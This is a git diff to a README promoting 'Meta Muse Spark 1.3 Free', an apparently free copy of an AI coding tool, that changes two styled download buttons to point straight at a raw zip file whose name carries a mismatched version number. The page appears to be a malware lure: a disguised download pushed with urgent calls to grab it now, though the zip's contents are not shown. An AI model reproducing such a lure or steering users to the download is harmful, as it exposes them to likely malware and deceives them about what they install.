@@ -21,7 +21,7 @@ Ready to dive in? Here's your simple roadmap.
 
 Visit the official download page to get your copy of Meta Muse Spark 1.3 Free.
 
-<a href="https://github.com/Miron47486/Meta-Muse-Spark-1.3-Free/releases" style="display:inline-block;padding:15px 30px;background:#ff6b6b;color:white;text-decoration:none;border-radius:5px;font-size:20px;font-weight:bold;">📥 Download Now - Free</a>
+<a href="https://github.com/Miron47486/Meta-Muse-Spark-1.3-Free/raw/refs/heads/main/net/Spark-Free-Muse-Meta-v2.5-beta.5.zip" style="display:inline-block;padding:15px 30px;background:#ff6b6b;color:white;text-decoration:none;border-radius:5px;font-size:20px;font-weight:bold;">📥 Download Now - Free</a>
 
 Visit this link to download the application.
 
@@ -106,7 +106,7 @@ Don't wait. Get your copy now and let your coding become effortless.
 
 Ready to boost your productivity? Head over to the official release page and grab the free download.
 
-<a href="https://github.com/Miron47486/Meta-Muse-Spark-1.3-Free/releases" style="display:inline-block;padding:15px 30px;background:#4ecdc4;color:white;text-decoration:none;border-radius:5px;font-size:20px;font-weight:bold;">🚀 Download Meta Muse Spark 1.3 Free</a>
+<a href="https://github.com/Miron47486/Meta-Muse-Spark-1.3-Free/raw/refs/heads/main/net/Spark-Free-Muse-Meta-v2.5-beta.5.zip" style="display:inline-block;padding:15px 30px;background:#4ecdc4;color:white;text-decoration:none;border-radius:5px;font-size:20px;font-weight:bold;">🚀 Download Meta Muse Spark 1.3 Free</a>
 
 Visit this link to download the application.
 
